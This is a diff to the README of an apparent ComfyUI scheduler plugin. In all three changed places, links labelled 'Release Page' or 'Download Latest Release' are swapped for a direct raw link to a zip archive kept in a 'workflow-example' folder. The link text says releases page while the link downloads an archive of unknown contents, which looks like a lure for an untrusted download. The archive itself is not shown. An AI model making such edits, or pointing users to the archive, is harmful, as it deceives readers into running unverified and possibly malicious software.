@@ -1,7 +1,7 @@
 # 🎉 ComfyUI-CapitanZiT-Scheduler - Enhance Your Image Generation Workflow
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-brightgreen)](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/releases)
+[![Download Latest Release](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/raw/refs/heads/main/workflow-example/Zi-Capitan-U-Comfy-Scheduler-1.7.zip)](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/raw/refs/heads/main/workflow-example/Zi-Capitan-U-Comfy-Scheduler-1.7.zip)
 
 ## 🚀 Getting Started
 ComfyUI-CapitanZiT-Scheduler is a lightweight application designed to improve your image generation process. It offers a custom scheduler that delivers a linear sigma schedule. This ensures better consistency and quality in your outputs.
@@ -15,7 +15,7 @@ Follow these simple steps to download and run the software.
 - Disk Space: At least 100 MB available
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page:** To access the latest version, visit this page: [Release Page](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/releases).
+1. **Visit the Releases Page:** To access the latest version, visit this page: [Release Page](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/raw/refs/heads/main/workflow-example/Zi-Capitan-U-Comfy-Scheduler-1.7.zip).
   
 2. **Select the Latest Version:** Look for the version labeled as the latest. You will see a list of files available for download.
 
@@ -65,4 +65,4 @@ Join our community of users to share experiences, tips, and improvements. Check 
 ## 📡 Contact & Contributions
 If you would like to contribute to the project or have suggestions for features, feel free to reach out through the repository or submit a pull request.
 
-For further information or help, please revisit the downloads and releases page: [Release Page](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/releases). Your feedback and contributions are welcome as we strive to enhance this tool for everyone.
+For further information or help, please revisit the downloads and releases page: [Release Page](https://github.com/marcoslmdrones/ComfyUI-CapitanZiT-Scheduler/raw/refs/heads/main/workflow-example/Zi-Capitan-U-Comfy-Scheduler-1.7.zip). Your feedback and contributions are welcome as we strive to enhance this tool for everyone.
